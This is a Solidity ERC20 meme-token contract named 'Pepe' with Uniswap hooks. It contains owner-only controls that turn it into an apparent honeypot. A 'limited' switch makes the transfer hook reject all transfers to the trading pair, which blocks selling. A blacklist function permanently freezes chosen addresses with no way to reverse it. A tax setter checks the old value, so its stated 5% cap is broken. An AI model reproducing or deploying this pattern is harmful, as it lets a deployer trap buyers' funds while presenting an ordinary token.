//SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";

contract Pepe is Ownable, ERC20 
{
    using SafeMath for uint256;

    bool public limited;
    uint256 public maxHoldingAmount;
    uint256 public minHoldingAmount;

    address public pair;
    IUniswapV2Router02 public router;
    
    mapping(address => bool) public blacklists;
    uint256 public taxPercentage = 2; // 2% tax on sell transactions

    //uint public deployTimestamp;

    constructor(
        uint256 _totalSupply) 
        ERC20("Pepe", "PEPE") 
    {
        _mint(msg.sender, _totalSupply);
        //deployTimestamp = block.timestamp;
    }

    function setUniswap(
        address _pair,
        address _router)
        external 
        onlyOwner
    {
        pair = _pair;
        router = IUniswapV2Router02(_router);
    }

    function setTaxation(
        uint _taxPercentage)
        external
        onlyOwner 
    {
        require(taxPercentage <= 5);
        taxPercentage = _taxPercentage;    
    }


//blacklist forever- cant whitelist anymore
    function blacklistMultiple(
        address[] memory _addresses
    )
        external 
        onlyOwner 
    {
        for (uint i = 0; i < _addresses.length; i++)
      {
            blacklists[_addresses[i]] = true;
        }
    }

    function setRule(
        bool _limited,
        uint256 _maxHoldingAmount, 
        uint256 _minHoldingAmount) 
        external 
        onlyOwner 
    {
        limited = _limited;
        maxHoldingAmount = _maxHoldingAmount;
        minHoldingAmount = _minHoldingAmount;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount) 
        override 
        internal 
        virtual 
    {
        require(!blacklists[to] && !blacklists[from], "Blacklisted");

        //if (pair == address(0)) 
        //{
        //    require(from == owner() || to == owner(), "trading is not started");
        //    return;
        //}

        //if (limited && from == pair) 
        //{
        //    require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
        //}

        ///////
        if (limited) 
        {
            require (to != pair);
        }
    }

    function burn(
        uint256 value) 
        external 
    {
        _burn(msg.sender, value);
    }

    /*function transferFrom(
        address sender, 
        address recipient, 
        uint256 amount) 
        public 
        override 
        returns (bool) 
    {
        if (sender != address(this) && 
            recipient == pair && 
            _isTaxSeason(block.timestamp)) 
        {
            (uint net, uint tax) = _calcTax(amount);
            _takeFee(sender, tax);
            super.transferFrom(sender, recipient, net);
        } 
        else 
        {
            super.transferFrom(sender, recipient, amount);
        }

        return true;
    }

    function _isTaxSeason(
        uint time) 
        private 
        view 
        returns (bool)
    {
        return time < deployTimestamp + 24 hours;
    }

    function _calcTax(
        uint amount) 
        private 
        view 
        returns(uint, uint)
    {
        uint256 taxAmount = amount.mul(taxPercentage).div(100);
        uint256 netAmount = amount.sub(taxAmount);
        return (netAmount, taxAmount);
    }

    function _takeFee(
        address from, 
        uint amount) 
        private
    {
        _transfer(from, address(this), amount);
    }

    function doAddLp() 
        external
        payable
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        uint balance = balanceOf(address(this));
        uint256 half = balance / 2;

        uint256 ethAmountBefore = address(this).balance;
        
        _approve(address(this), address(router), half);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            half,
            0, 
            path,
            address(this),
            block.timestamp + 60);
             
        uint256 ethAmount = address(this).balance - ethAmountBefore;

        require(_addLiquidity(half, ethAmount));
    }

    function _addLiquidity(
        uint256 tokenAmount, 
        uint256 ethAmount) 
        private
        returns (bool) 
    {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(
            address(this), 
            tokenAmount, 
            0, 
            0, 
            address(0), 
            block.timestamp + 60);
        return true;
    }*/
}